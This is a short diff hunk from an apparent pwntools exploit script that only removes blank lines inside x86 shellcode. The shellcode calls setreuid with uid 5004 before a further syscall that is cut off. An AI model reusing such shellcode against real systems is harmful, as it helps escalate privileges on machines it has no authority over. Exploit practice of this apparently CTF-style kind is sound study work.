@@ -306,13 +306,10 @@ lpp = 0x08049052
 shellcode = asm("""
     xor eax, eax
     mov al, 0x46
-
     xor ebx, ebx
     mov bx, 0x138c
-
     xor ecx, ecx
     mov cx, 0x138c
-
     int 0x80
 
     xor eax, eax
